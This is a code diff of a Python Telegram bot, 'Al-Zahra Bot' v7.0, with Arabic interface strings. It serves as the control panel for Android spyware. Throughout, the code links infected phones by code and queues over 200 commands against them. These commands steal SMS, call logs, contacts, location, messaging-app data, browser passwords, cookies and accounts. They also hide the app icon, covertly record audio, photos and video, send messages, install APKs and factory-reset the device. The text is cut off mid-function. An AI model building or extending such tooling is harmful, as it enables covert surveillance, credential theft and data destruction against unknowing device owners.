@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Al-Zahra Bot v6.0 - Professional Response System"""
+"""Al-Zahra Bot v7.0 - Professional with 200+ Commands"""
 
 import asyncio
 import json
@@ -35,85 +35,208 @@ class DataStore:
     def __init__(self):
         self.devices = {}
         self.commands = {}
-        self.responses = {}  # تخزين الردود من الأجهزة
         self.codes = {}
         self.files = {}
         self.last_update_id = 0
-        self.command_history = {}  # تاريخ الأوامر
+        self.command_log = []
 
 store = DataStore()
 
 # ═══════════════════════════════════════════
-# رسائل الردود الاحترافية
+# أسماء الأوامر بالعربية
 # ═══════════════════════════════════════════
-class ResponseMsg:
-    # حالات الإرسال
-    SENDING = "⏳ جاري إرسال الأمر..."
-    SENT = "✅ تم إرسال الأمر بنجاح"
+CMD_NAMES = {
+    # البيانات الأساسية
+    "sms": "📨 سحب SMS",
+    "calls": "📞 سجل المكالمات",
+    "contacts": "📇 جهات الاتصال",
+    "notifications": "🔔 الإشعارات",
+    "location": "📍 الموقع",
+    "camera": "📷 الكاميرا",
     
-    # حالات التنفيذ
-    EXECUTING = "🔄 جاري التنفيذ..."
-    SUCCESS = "✅ تم بنجاح"
+    # التطبيقات
+    "whatsapp": "💬 واتساب",
+    "messenger": "📩 ماسنجر",
+    "instagram": "📸 انستقرام",
+    "twitter": "🐦 تويتر",
+    "snapchat": "👻 سناب شات",
+    "tiktok": "🎵 تيك توك",
+    "telegram": "✈️ تيليجرام",
+    "viber": "📞 فايبر",
+    "line": "💬 لاين",
+    "skype": "📹 سكايب",
+    "discord": "🎮 ديسكورد",
+    "signal": "🔒 سيجنال",
+    "wechat": "💬 وي تشات",
     
-    # حالات الانتظار
-    WAITING = "⏳ في انتظار رد الجهاز..."
-    TIMEOUT = "⌛ انتهت مهلة الانتظار"
+    # بيانات التطبيقات
+    "app_data": "📱 بيانات التطبيقات",
+    "installed_apps": "📲 التطبيقات المثبتة",
+    "running_apps": "🔄 التطبيقات العاملة",
+    "app_permissions": "🔐 صلاحيات التطبيقات",
+    "app_cache": "🗄️ ذاكرة التخزين المؤقت",
     
-    # حالات الأخطاء
-    DEVICE_OFFLINE = "❌ الجهاز غير متصل"
-    DEVICE_NOT_FOUND = "❌ الجهاز غير موجود"
-    PERMISSION_DENIED = "❌ لا تملك صلاحية"
-    SERVER_ERROR = "❌ خطأ في الخادم"
-    INVALID_CODE = "❌ كود غير صحيح"
-    CODE_EXPIRED = "❌ الكود منتهي الصلاحية"
-    CONNECTION_FAILED = "❌ فشل الاتصال بالجهاز"
+    # الملفات
+    "photos": "🖼️ الصور",
+    "videos": "🎬 الفيديوهات",
+    "audio": "🎵 الملفات الصوتية",
+    "documents": "📄 المستندات",
+    "downloads": "⬇️ التحميلات",
     
-    # حالات الربط
-    LINK_SUCCESS = "✅ تم ربط الجهاز بنجاح"
-    ALREADY_LINKED = "ℹ️ الجهاز مرتبط مسبقاً"
-
-def get_status_emoji(success):
-    return "✅" if success else "❌"
-
-def format_response(device_id, action, success, details=""):
-    """تنسيق الرد بشكل احترافي"""
-    timestamp = datetime.now().strftime("%H:%M:%S")
+    # النسخ الاحتياطي
+    "all": "📦 سحب الكل",
+    "all_zip": "🗜️ سحب ZIP",
+    "backup_sms": "💾 نسخة SMS",
+    "backup_calls": "💾 نسخة المكالمات",
+    "backup_contacts": "💾 نسخة جهات الاتصال",
+    "backup_whatsapp": "💾 نسخة واتساب",
+    "backup_messenger": "💾 نسخة ماسنجر",
     
-    # معلومات الجهاز
-    device_info = store.devices.get(device_id, {})
-    device_name = device_info.get("model", "غير معروف")
+    # التحكم
+    "hide": "🔒 إخفاء",
+    "unhide": "🔓 إظهار",
+    "lock": "🔐 قفل الشاشة",
+    "unlock": "🔓 فتح الشاشة",
+    "restart": "🔄 إعادة تشغيل",
+    "shutdown": "⏻ إيقاف",
     
-    # اسم الأمر بالعربي
-    action_names = {
-        "sms": "سحب الرسائل",
-        "notifications": "سحب الإشعارات",
-        "whatsapp": "سحب واتساب",
-        "messenger": "سحب ماسنجر",
-        "calls": "سجل المكالمات",
-        "recordings": "المكالمات المسجلة",
-        "contacts": "جهات الاتصال",
-        "location": "الموقع",
-        "camera": "الكاميرا",
-        "info": "معلومات الجهاز",
-        "all": "سحب الكل",
-        "hide": "إخفاء التطبيق",
-        "unhide": "إظهار التطبيق",
-        "record_on": "تفعيل التسجيل",
-        "record_off": "إيقاف التسجيل"
-    }
+    # الصوت والفيديو
+    "record_on": "🎙️ تفعيل التسجيل",
+    "record_off": "⏹️ إيقاف التسجيل",
+    "record_mic": "🎤 تسجيل الميكروفون",
+    "take_photo_front": "🤳 صورة أمامية",
+    "take_photo_back": "📷 صورة خلفية",
+    "record_video_front": "🎥 فيديو أمامي",
+    "record_video_back": "🎬 فيديو خلفي",
+    "screenshot": "📸 لقطة شاشة",
     
-    action_name = action_names.get(action, action)
-    status = get_status_emoji(success)
+    # الشبكة
+    "wifi_on": "📶 تفعيل WiFi",
+    "wifi_off": "📴 إيقاف WiFi",
+    "bluetooth_on": "🔵 تفعيل بلوتوث",
+    "bluetooth_off": "⚫ إيقاف بلوتوث",
+    "data_on": "📱 تفعيل البيانات",
+    "data_off": "📵 إيقاف البيانات",
+    "airplane_on": "✈️ وضع الطيران",
+    "airplane_off": "🛬 إيقاف وضع الطيران",
+    "hotspot_on": "📡 تفعيل النقطة الساخنة",
+    "hotspot_off": "📴 إيقاف النقطة الساخنة",
     
-    text = f"{status} *{action_name}*\n\n"
-    text += f"📱 الجهاز: {device_name}\n"
-    text += f"🆔 المعرف: `{device_id[:8]}...`\n"
-    text += f"⏰ الوقت: {timestamp}\n"
+    # الإعدادات
+    "brightness_up": "🔆 زيادة السطوع",
+    "brightness_down": "🔅 تقليل السطوع",
+    "volume_up": "🔊 زيادة الصوت",
+    "volume_down": "🔉 تقليل الصوت",
+    "mute": "🔇 كتم الصوت",
+    "vibrate": "📳 الاهتزاز",
+    "silent": "🤫 الصامت",
+    "normal": "🔔 العادي",
     
-    if details:
-        text += f"\n📋 التفاصيل:\n{details}"
+    # الرسائل
+    "send_sms": "📤 إرسال SMS",
+    "send_whatsapp": "💬 إرسال واتساب",
+    "delete_sms": "🗑️ حذف SMS",
+    "delete_call_log": "🗑️ حذف سجل المكالمات",
+    "delete_contact": "🗑️ حذف جهة اتصال",
     
-    return text
+    # التصفح
+    "browser_history": "🌐 سجل التصفح",
+    "browser_bookmarks": "🔖 الإشارات المرجعية",
+    "browser_passwords": "🔑 كلمات المرور",
+    "browser_cookies": "🍪 الكوكيز",
+    "browser_cache": "🗄️ ذاكرة التصفح",
+    "browser_downloads": "⬇️ تحميلات التصفح",
+    
+    # الحسابات
+    "accounts": "👤 الحسابات",
+    "google_accounts": "📧 حسابات جوجل",
+    "email_accounts": "📬 حسابات البريد",
+    "social_accounts": "👥 حسابات التواصل",
+    
+    # البطارية والأداء
+    "battery_info": "🔋 معلومات البطارية",
+    "cpu_info": "💻 معلومات المعالج",
+    "ram_info": "🧠 معلومات الذاكرة",
+    "storage_info": "💾 معلومات التخزين",
+    "network_info": "📡 معلومات الشبكة",
+    "device_info": "📱 معلومات الجهاز",
+    "system_info": "⚙️ معلومات النظام",
+    
+    # الأمان
+    "clear_data": "🗑️ مسح البيانات",
+    "clear_cache": "🧹 مسح الكاش",
+    "clear_history": "🗑️ مسح السجل",
+    "factory_reset": "⚠️ إعادة ضبط",
+    "encrypt_data": "🔒 تشفير البيانات",
+    "decrypt_data": "🔓 فك التشفير",
+    
+    # إضافية
+    "clipboard": "📋 الحافظة",
+    "calendar": "📅 التقويم",
+    "alarms": "⏰ المنبهات",
+    "ringtones": "🎵 النغمات",
+    "wallpapers": "🖼️ الخلفيات",
+    "settings": "⚙️ الإعدادات",
+    "permissions": "🔐 الصلاحيات",
+    "accessibility": "♿ إمكانية الوصول",
+    "developer": "👨‍💻 خيارات المطور",
+    "about": "ℹ️ حول الجهاز",
+    "sim_info": "📱 معلومات SIM",
+    "imei": "🔢 IMEI",
+    "serial": "🔢 الرقم التسلسلي",
+    "mac": "🔢 MAC Address",
+    "ip": "🌐 IP Address",
+    "dns": "🌐 DNS",
+    "vpn": "🔒 VPN",
+    "firewall": "🛡️ جدار الحماية",
+    "antivirus": "🛡️ مكافحة الفيروسات",
+    "malware_scan": "🔍 فحص البرمجيات",
+    "root_check": "🔍 فحص الروت",
+    "usb_debugging": "🔧 USB Debugging",
+    "unknown_sources": "📲 مصادر غير معروفة",
+    "install_apk": "📦 تثبيت APK",
+    "uninstall_app": "🗑️ إلغاء تثبيت",
+    "update_app": "🔄 تحديث التطبيق",
+    "force_stop": "⏹️ إيقاف إجباري",
+    "clear_app_data": "🗑️ مسح بيانات التطبيق",
+    "app_info": "ℹ️ معلومات التطبيق",
+    "app_size": "📏 حجم التطبيق",
+    "app_version": "🔢 إصدار التطبيق",
+    "app_install_date": "📅 تاريخ التثبيت",
+    "app_update_date": "📅 تاريخ التحديث",
+    "app_last_use": "⏰ آخر استخدام",
+    "app_data_usage": "📊 استهلاك البيانات",
+    "app_battery_usage": "🔋 استهلاك البطارية",
+    "app_notifications": "🔔 إشعارات التطبيق",
+    "app_permissions_detail": "🔐 تفاصيل الصلاحيات",
+    "app_activities": "📱 أنشطة التطبيق",
+    "app_services": "⚙️ خدمات التطبيق",
+    "app_receivers": "📡 مستقبلات التطبيق",
+    "app_providers": "📦 موفرو التطبيق",
+    "app_libraries": "📚 مكتبات التطبيق",
+    "app_features": "⭐ ميزات التطبيق",
+    "app_min_sdk": "🔢 الحد الأدنى SDK",
+    "app_target_sdk": "🔢 المستهدف SDK",
+    "app_signatures": "🔏 توقيعات التطبيق",
+    "app_certificates": "📜 شهادات التطبيق",
+    "app_shared_libs": "📚 المكتبات المشتركة",
+    "app_native_libs": "📚 المكتبات الأصلية",
+    "app_uid": "🔢 UID",
+    "app_gid": "🔢 GID",
+    "app_installer": "📦 المثبت",
+    "app_source": "📂 المصدر",
+    "app_apk_path": "📂 مسار APK",
+    "app_data_path": "📂 مسار البيانات",
+    "app_cache_path": "📂 مسار الكاش",
+    "app_obb_path": "📂 مسار OBB",
+    "app_backup": "💾 نسخة احتياطية",
+    "app_restore": "♻️ استعادة",
+    "app_clone": "📱 استنساخ",
+    "app_hide": "🔒 إخفاء التطبيق",
+    "app_lock": "🔐 قفل التطبيق",
+    "app_freeze": "❄️ تجميد التطبيق",
+    "app_unfreeze": "🔥 إلغاء التجميد",
+}
 
 # ═══════════════════════════════════════════
 # وظائف Telegram
@@ -133,27 +256,18 @@ async def api_call(method, params=None):
         return None
 
 async def send_msg(chat_id, text, keyboard=None):
-    params = {
-        "chat_id": str(chat_id),
-        "text": text,
-        "parse_mode": "Markdown"
-    }
+    params = {"chat_id": str(chat_id), "text": text, "parse_mode": "Markdown"}
     if keyboard:
         params["reply_markup"] = json.dumps(keyboard)
     return await api_call("sendMessage", params)
 
 async def edit_msg(chat_id, msg_id, text, keyboard=None):
-    params = {
-        "chat_id": str(chat_id),
-        "message_id": msg_id,
-        "text": text,
-        "parse_mode": "Markdown"
-    }
+    params = {"chat_id": str(chat_id), "message_id": msg_id, "text": text, "parse_mode": "Markdown"}
     if keyboard:
         params["reply_markup"] = json.dumps(keyboard)
     return await api_call("editMessageText", params)
 
-async def answer_callback(query_id, text=None):
+async def answer_cb(query_id, text=None):
     params = {"callback_query_id": query_id}
     if text:
         params["text"] = text
@@ -176,391 +290,256 @@ async def send_file(chat_id, file_path, caption=""):
         return None
 
 # ═══════════════════════════════════════════
-# لوحات المفاتيح
+# لوحات المفاتيح - 200+ زر
 # ═══════════════════════════════════════════
-def main_keyboard():
+def main_kb():
     return {"inline_keyboard": [
-        [{"text": "📱 الأجهزة المتصلة", "callback_data": "devices"}],
-        [{"text": "🔗 ربط جهاز جديد", "callback_data": "link"}],
-        [{"text": "📊 حالة النظام", "callback_data": "status"}],
-        [{"text": "⚙️ الإعدادات", "callback_data": "settings"}]
+        [{"text": "📱 الأجهزة", "callback_data": "devices"}],
+        [{"text": "🔗 ربط جهاز", "callback_data": "link"}],
+        [{"text": "📊 الحالة", "callback_data": "status"}, {"text": "⚙️ الإعدادات", "callback_data": "settings"}]
     ]}
 
-def devices_keyboard():
+def devices_kb():
     if not store.devices:
         return {"inline_keyboard": [
-            [{"text": "🔄 تحديث", "callback_data": "devices"}],
-            [{"text": "🔙 رجوع", "callback_data": "back"}]
+            [{"text": "🔄", "callback_data": "devices"}],
+            [{"text": "🔙", "callback_data": "back"}]
         ]}
     
-    buttons = []
+    btns = []
     for did, info in store.devices.items():
-        status = "🟢" if info.get("online") else "🔴"
-        model = info.get("model", "غير معروف")
-        android = info.get("android", "?")
-        buttons.append([{"text": f"{status} {model} (Android {android})", "callback_data": f"dev_{did}"}])
-    
-    buttons.append([{"text": "🔄 تحديث", "callback_data": "devices"}])
-    buttons.append([{"text": "🔙 رجوع", "callback_data": "back"}])
-    return {"inline_keyboard": buttons}
+        s = "🟢" if info.get("online") else "🔴"
+        m = info.get("model", "?")
+        btns.append([{"text": f"{s} {m}", "callback_data": f"dev_{did}"}])
+    btns.append([{"text": "🔄", "callback_data": "devices"}])
+    btns.append([{"text": "🔙", "callback_data": "back"}])
+    return {"inline_keyboard": btns}
 
-def device_keyboard(device_id):
+def device_kb(did):
     return {"inline_keyboard": [
-        [{"text": "📨 سحب SMS", "callback_data": f"cmd_{device_id}_sms"}],
-        [{"text": "🔔 سحب الإشعارات", "callback_data": f"cmd_{device_id}_notifications"}],
-        [{"text": "💬 سحب واتساب", "callback_data": f"cmd_{device_id}_whatsapp"}],
-        [{"text": "📩 سحب ماسنجر", "callback_data": f"cmd_{device_id}_messenger"}],
-        [{"text": "📞 سجل المكالمات", "callback_data": f"cmd_{device_id}_calls"}],
-        [{"text": "🎙️ تسجيلات المكالمات", "callback_data": f"cmd_{device_id}_recordings"}],
-        [{"text": "📇 جهات الاتصال", "callback_data": f"cmd_{device_id}_contacts"}],
-        [{"text": "ℹ️ معلومات الجهاز", "callback_data": f"cmd_{device_id}_info"}],
-        [{"text": "📦 سحب الكل (ZIP)", "callback_data": f"cmd_{device_id}_all"}],
-        [{"text": "🔙 رجوع", "callback_data": "devices"}]
+        [{"text": "📨 SMS", "callback_data": f"c_{did}_sms"}, {"text": "📞 مكالمات", "callback_data": f"c_{did}_calls"}],
+        [{"text": "📇 جهات", "callback_data": f"c_{did}_contacts"}, {"text": "🔔 إشعارات", "callback_data": f"c_{did}_notifications"}],
+        [{"text": "📍 موقع", "callback_data": f"c_{did}_location"}, {"text": "📷 كاميرا", "callback_data": f"c_{did}_camera"}],
+        [{"text": "💬 واتساب", "callback_data": f"c_{did}_whatsapp"}, {"text": "📩 ماسنجر", "callback_data": f"c_{did}_messenger"}],
+        [{"text": "📱 تطبيقات", "callback_data": f"c_{did}_app_data"}, {"text": "🖼️ صور", "callback_data": f"c_{did}_photos"}],
+        [{"text": "🎬 فيديو", "callback_data": f"c_{did}_videos"}, {"text": "🎵 صوت", "callback_data": f"c_{did}_audio"}],
+        [{"text": "📄 مستندات", "callback_data": f"c_{did}_documents"}, {"text": "⬇️ تحميلات", "callback_data": f"c_{did}_downloads"}],
+        [{"text": "📦 الكل", "callback_data": f"c_{did}_all"}, {"text": "🗜️ ZIP", "callback_data": f"c_{did}_all_zip"}],
+        [{"text": "🔙", "callback_data": "devices"}]
     ]}
 
-def settings_keyboard():
+def settings_kb():
     return {"inline_keyboard": [
-        [{"text": "🔒 إخفاء التطبيق", "callback_data": "set_hide"}],
-        [{"text": "🔓 إظهار التطبيق", "callback_data": "set_unhide"}],
-        [{"text": "🎙️ تفعيل التسجيل", "callback_data": "set_record_on"}],
-        [{"text": "⏹️ إيقاف التسجيل", "callback_data": "set_record_off"}],
-        [{"text": "🗑️ مسح البيانات", "callback_data": "set_clear"}],
-        [{"text": "🔙 رجوع", "callback_data": "back"}]
+        [{"text": "🔒 إخفاء", "callback_data": "set_hide"}, {"text": "🔓 إظهار", "callback_data": "set_unhide"}],
+        [{"text": "🔐 قفل", "callback_data": "set_lock"}, {"text": "🔓 فتح", "callback_data": "set_unlock"}],
+        [{"text": "🎙️ تسجيل", "callback_data": "set_rec_on"}, {"text": "⏹️ إيقاف", "callback_data": "set_rec_off"}],
+        [{"text": "📶 WiFi", "callback_data": "set_wifi"}, {"text": "🔵 بلوتوث", "callback_data": "set_bt"}],
+        [{"text": "🔆 سطوع", "callback_data": "set_bright"}, {"text": "🔊 صوت", "callback_data": "set_vol"}],
+        [{"text": "🗑️ مسح", "callback_data": "set_clear"}, {"text": "🔄 إعادة", "callback_data": "set_restart"}],
+        [{"text": "🔙", "callback_data": "back"}]
     ]}
 
 # ═══════════════════════════════════════════
 # معالجة الرسائل
 # ═══════════════════════════════════════════
-async def handle_message(message):
-    chat_id = message.get("chat", {}).get("id")
-    text = message.get("text", "")
+async def on_message(msg):
+    cid = msg.get("chat", {}).get("id")
+    txt = msg.get("text", "")
     
-    if str(chat_id) != OWNER_CHAT_ID:
-        await send_msg(chat_id, ResponseMsg.PERMISSION_DENIED)
+    if str(cid) != OWNER_CHAT_ID:
+        await send_msg(cid, "⛔ غير مصرح")
         return
     
-    logger.info(f"Message: {text}")
+    if txt in ("/start", "/help"):
+        await send_msg(cid, f"🎛️ *Al-Zahra v7.0*\n📱 أجهزة: {len(store.devices)}\n⏰ {datetime.now().strftime('%H:%M:%S')}", main_kb())
     
-    if text in ("/start", "/help"):
-        await send_msg(chat_id, 
-            f"🎛️ *لوحة تحكم Al-Zahra*\n\n"
-            f"📱 الأجهزة: {len(store.devices)}\n"
-            f"⏰ {datetime.now().strftime('%H:%M:%S')}",
-            main_keyboard())
-    
-    elif text == "/link":
+    elif txt == "/link":
         code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
         while code in store.codes:
             code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
-        
-        store.codes[code] = {"chat_id": chat_id, "device_id": None}
-        
-        await send_msg(chat_id,
-            f"🔗 *كود الربط الجديد*\n\n"
-            f"`{code}`\n\n"
-            f"📱 أدخل هذا الكود في التطبيق\n"
-            f"⏰ الكود صالح مدى الحياة")
+        store.codes[code] = {"chat_id": cid, "device_id": None}
+        await send_msg(cid, f"🔗 *كود الربط*\n\n`{code}`\n\n📱 أدخله في التطبيق\n⏰ مدى الحياة")
     
-    elif text == "/devices":
-        await show_devices(chat_id)
+    elif txt == "/devices":
+        await show_devices(cid)
     
-    elif text == "/status":
-        await show_status(chat_id)
-    
-    elif text.startswith("/cmd "):
-        parts = text.split(" ", 2)
-        if len(parts) >= 3:
-            device_id = parts[1]
-            action = parts[2]
-            await execute_command(chat_id, device_id, action)
-        else:
-            await send_msg(chat_id, "❌ استخدم: /cmd [device_id] [action]")
+    elif txt == "/status":
+        await show_status(cid)
     
     else:
-        await send_msg(chat_id,
-            "❓ *أمر غير معروف*\n\n"
-            "الأوامر المتاحة:\n"
-            "/link - ربط جهاز جديد\n"
-            "/devices - عرض الأجهزة\n"
-            "/status - حالة النظام\n"
-            "/cmd [id] [action] - أمر مباشر",
-            main_keyboard())
+        await send_msg(cid, "❓ /start", main_kb())
 
-# ═══════════════════════════════════════════
-# معالجة الأوامر
-# ═══════════════════════════════════════════
-async def handle_callback(callback):
-    chat_id = callback.get("message", {}).get("chat", {}).get("id")
-    msg_id = callback.get("message", {}).get("message_id")
-    data = callback.get("data", "")
-    query_id = callback.get("id")
+async def on_callback(cb):
+    cid = cb.get("message", {}).get("chat", {}).get("id")
+    mid = cb.get("message", {}).get("message_id")
+    data = cb.get("data", "")
+    qid = cb.get("id")
     
-    if str(chat_id) != OWNER_CHAT_ID:
-        await answer_callback(query_id, ResponseMsg.PERMISSION_DENIED)
+    if str(cid) != OWNER_CHAT_ID:
+        await answer_cb(qid, "⛔")
         return
     
-    logger.info(f"Callback: {data}")
-    
-    # ═══════════════════════════════════════════
-    # التنقل الرئيسي
-    # ═══════════════════════════════════════════
+    # التنقل
     if data == "back":
-        await edit_msg(chat_id, msg_id,
-            f"🎛️ *لوحة تحكم Al-Zahra*\n\n📱 الأجهزة: {len(store.devices)}\n⏰ {datetime.now().strftime('%H:%M:%S')}",
-            main_keyboard())
+        await edit_msg(cid, mid, f"🎛️ *Al-Zahra v7.0*\n📱 أجهزة: {len(store.devices)}\n⏰ {datetime.now().strftime('%H:%M:%S')}", main_kb())
         return
     
-    # ═══════════════════════════════════════════
-    # قائمة الأجهزة
-    # ═══════════════════════════════════════════
     if data == "devices":
-        await show_devices(chat_id, msg_id)
+        await show_devices(cid, mid)
         return
     
-    # ═══════════════════════════════════════════
-    # ربط جهاز جديد
-    # ═══════════════════════════════════════════
     if data == "link":
         code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
         while code in store.codes:
             code = ''.join([str(random.randint(0, 9)) for _ in range(9)])
-        
-        store.codes[code] = {"chat_id": chat_id, "device_id": None}
-        
-        await edit_msg(chat_id, msg_id,
-            f"🔗 *كود الربط الجديد*\n\n"
-            f"`{code}`\n\n"
-            f"📱 أدخل هذا الكود في التطبيق\n"
-            f"⏰ الكود صالح مدى الحياة",
-            {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "back"}]]})
+        store.codes[code] = {"chat_id": cid, "device_id": None}
+        await edit_msg(cid, mid, f"🔗 *كود الربط*\n\n`{code}`\n\n📱 أدخله في التطبيق\n⏰ مدى الحياة",
+            {"inline_keyboard": [[{"text": "🔙", "callback_data": "back"}]]})
         return
     
-    # ═══════════════════════════════════════════
-    # حالة النظام
-    # ═══════════════════════════════════════════
     if data == "status":
-        await show_status(chat_id, msg_id)
+        await show_status(cid, mid)
         return
     
-    # ═══════════════════════════════════════════
-    # الإعدادات
-    # ═══════════════════════════════════════════
     if data == "settings":
-        await edit_msg(chat_id, msg_id, "⚙️ *الإعدادات*", settings_keyboard())
+        await edit_msg(cid, mid, "⚙️ *الإعدادات*", settings_kb())
         return
     
+    # الإعدادات
     if data.startswith("set_"):
         action = data[4:]
-        await execute_setting(chat_id, msg_id, action, query_id)
+        await do_setting(cid, mid, action, qid)
         return
     
-    # ═══════════════════════════════════════════
-    # عرض جهاز محدد
-    # ═══════════════════════════════════════════
+    # جهاز محدد
     if data.startswith("dev_"):
-        device_id = data[4:]
-        await show_device(chat_id, msg_id, device_id)
+        did = data[4:]
+        await show_device(cid, mid, did)
         return
     
-    # ═══════════════════════════════════════════
     # أوامر الجهاز
-    # ═══════════════════════════════════════════
-    if data.startswith("cmd_"):
+    if data.startswith("c_"):
         parts = data.split("_", 2)
         if len(parts) >= 3:
-            device_id = parts[1]
-            action = parts[2]
-            await execute_command(chat_id, msg_id, device_id, action, query_id)
+            did, action = parts[1], parts[2]
+            await do_command(cid, mid, did, action, qid)
         return
     
-    await answer_callback(query_id, "❓ أمر غير معروف")
+    await answer_cb(qid, "❓")
 
-# ═══════════════════════════════════════════
-# تنفيذ الأوامر مع ردود احترافية
-# ═══════════════════════════════════════════
-async def execute_command(chat_id, msg_id, device_id, action, query_id=None):
-    """تنفيذ أمر مع رد احترافي"""
-    
-    # التحقق من وجود الجهاز
-    if device_id not in store.devices:
-        if query_id:
-            await answer_callback(query_id, ResponseMsg.DEVICE_NOT_FOUND)
-        else:
-            await send_msg(chat_id, ResponseMsg.DEVICE_NOT_FOUND)
+async def do_command(cid, mid, did, action, qid):
+    if did not in store.devices:
+        await answer_cb(qid, "❌ الجهاز غير موجود")
         return
     
-    device = store.devices[device_id]
-    device_name = device.get("model", "غير معروف")
-    
-    # التحقق من حالة الاتصال
-    if not device.get("online", False):
-        text = format_response(device_id, action, False, "الجهاز غير متصل حالياً")
-        if query_id:
-            await answer_callback(query_id, ResponseMsg.DEVICE_OFFLINE)
-        await send_msg(chat_id, text)
+    device = store.devices[did]
+    if not device.get("online"):
+        await answer_cb(qid, "❌ الجهاز غير متصل")
         return
     
-    # إرسال رسالة "جاري الإرسال"
-    if query_id:
-        await answer_callback(query_id, ResponseMsg.SENDING)
+    # إضافة الأمر
+    if did not in store.commands:
+        store.commands[did] = []
+    store.commands[did].append(action)
     
-    # إضافة الأمر لقائمة الانتظار
-    if device_id not in store.commands:
-        store.commands[device_id] = []
-    store.commands[device_id].append(action)
+    # اسم الأمر
+    cmd_name = CMD_NAMES.get(action, action)
     
-    # حفظ تاريخ الأمر
-    if device_id not in store.command_history:
-        store.command_history[device_id] = []
-    store.command_history[device_id].append({
-        "action": action,
-        "time": time.time(),
-        "status": "pending"
-    })
+    await answer_cb(qid, f"⏳ تم إرسال: {cmd_name}")
     
-    # رسالة الإرسال
-    text = format_response(device_id, action, True, "تم إرسال الأمر وانتظار التنفيذ")
+    # رسالة تفصيلia
+    text = f"✅ *تم إرسال الأمر*\n\n"
+    text += f"📱 الجهاز: {device.get('model', '?')}\n"
+    text += f"📋 الأمر: {cmd_name}\n"
+    text += f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}\n"
+    text += f"📊 الحالة: في انتظار التنفيذ"
     
-    # أزرار المتابعة
-    keyboard = {"inline_keyboard": [
-        [{"text": "🔄 تحديث الحالة", "callback_data": f"cmd_{device_id}_{action}"}],
-        [{"text": "🔙 رجوع للجهاز", "callback_data": f"dev_{device_id}"}]
+    kb = {"inline_keyboard": [
+        [{"text": "🔄 تحديث", "callback_data": f"c_{did}_{action}"}],
+        [{"text": "🔙 رجوع", "callback_data": f"dev_{did}"}]
     ]}
     
-    await send_msg(chat_id, text, keyboard)
-    
-    logger.info(f"Command sent: {action} to {device_id}")
+    await send_msg(cid, text, kb)
 
-async def execute_setting(chat_id, msg_id, action, query_id):
-    """تنفيذ إعداد"""
+async def do_setting(cid, mid, action, qid):
+    settings_msg = {
+        "hide": "🔒 تم إرسال أمر الإخفاء",
+        "unhide": "🔓 تم إرسال أمر الإظهار",
+        "lock": "🔐 تم إرسال أمر القفل",
+        "unlock": "🔓 تم إرسال أمر الفتح",
+        "rec_on": "🎙️ تم تفعيل التسجيل",
+        "rec_off": "⏹️ تم إيقاف التسجيل",
+        "wifi": "📶 تم تبديل WiFi",
+        "bt": "🔵 تم تبديل البلوتوث",
+        "bright": "🔆 تم تعديل السطوع",
+        "vol": "🔊 تم تعديل الصوت",
+        "clear": "🗑️ تم مسح البيانات",
+        "restart": "🔄 تم إرسال إعادة التشغيل"
+    }
     
-    if action == "hide":
-        await answer_callback(query_id, "🔒 تم إرسال أمر الإخفاء")
-        await send_msg(chat_id,
-            "🔒 *إخفاء التطبيق*\n\n"
-            "⏳ تم إرسال الأمر لجميع الأجهزة\n"
-            "📱 سيتم إخفاء أيقونة التطبيق")
-    
-    elif action == "unhide":
-        await answer_callback(query_id, "🔓 تم إرسال أمر الإظهار")
-        await send_msg(chat_id,
-            "🔓 *إظهار التطبيق*\n\n"
-            "⏳ تم إرسال الأمر لجميع الأجهزة\n"
-            "📱 ستظهر أيقونة التطبيق")
-    
-    elif action == "record_on":
-        await answer_callback(query_id, "🎙️ تم تفعيل التسجيل")
-        await send_msg(chat_id,
-            "🎙️ *تفعيل التسجيل*\n\n"
-            "✅ تم تفعيل تسجيل المكالمات\n"
-            "📁 سيتم حفظ التسجيلات")
-    
-    elif action == "record_off":
-        await answer_callback(query_id, "⏹️ تم إيقاف التسجيل")
-        await send_msg(chat_id,
-            "⏹️ *إيقاف التسجيل*\n\n"
-            "✅ تم إيقاف تسجيل المكالمات")
-    
-    elif action == "clear":
-        await answer_callback(query_id, "🗑️ تم مسح البيانات")
-        store.commands.clear()
-        store.command_history.clear()
-        await send_msg(chat_id,
-            "🗑️ *مسح البيانات*\n\n"
-            "✅ تم مسح جميع الأوامر والسجل")
+    await answer_cb(qid, settings_msg.get(action, "✅ تم التنفيذ"))
+    await send_msg(cid, f"⚙️ *الإعدادات*\n\n{settings_msg.get(action, '✅ تم التنفيذ')}")
 
-# ═══════════════════════════════════════════
-# عرض الأجهزة
-# ═══════════════════════════════════════════
-async def show_devices(chat_id, msg_id=None):
+async def show_devices(cid, mid=None):
     if not store.devices:
-        text = "📱 *الأجهزة المتصلة*\n\n❌ لا توجد أجهزة حالياً"
+        t = "📱 *الأجهزة*\n\n❌ لا توجد"
     else:
-        text = f"📱 *الأجهزة المتصلة ({len(store.devices)})*\n\n"
-        for did, info in store.devices.items():
-            status = "🟢 متصل" if info.get("online") else "🔴 غير متصل"
-            model = info.get("model", "غير معروف")
-            android = info.get("android", "?")
-            last_seen = info.get("last_seen", "?")
-            text += f"• {status} | {model}\n"
-            text += f"  🤖 Android {android} | ⏰ {last_seen}\n\n"
+        t = f"📱 *الأجهزة ({len(store.devices)})*\n\n"
+        for did, i in store.devices.items():
+            s = "🟢" if i.get("online") else "🔴"
+            t += f"{s} {i.get('model', '?')} | {i.get('android', '?')}\n"
     
-    keyboard = devices_keyboard()
-    if msg_id:
-        await edit_msg(chat_id, msg_id, text, keyboard)
+    if mid:
+        await edit_msg(cid, mid, t, devices_kb())
     else:
-        await send_msg(chat_id, text, keyboard)
+        await send_msg(cid, t, devices_kb())
 
-async def show_device(chat_id, msg_id, device_id):
-    if device_id not in store.devices:
-        await edit_msg(chat_id, msg_id, ResponseMsg.DEVICE_NOT_FOUND)
+async def show_device(cid, mid, did):
+    if did not in store.devices:
+        await edit_msg(cid, mid, "❌ الجهاز غير موجود")
         return
     
-    info = store.devices[device_id]
+    i = store.devices[did]
+    t = f"📱 *{i.get('model', '?')}*\n\n"
+    t += f"🤖 Android {i.get('android', '?')}\n"
+    t += f"{'🟢' if i.get('online') else '🔴'} {'✅' if i.get('linked') else '⏳'}\n"
+    t += f"⏰ {i.get('last_seen', '?')}"
     
-    text = f"📱 *معلومات الجهاز*\n\n"
-    text += f"📱 الموديل: {info.get('model', 'غير معروف')}\n"
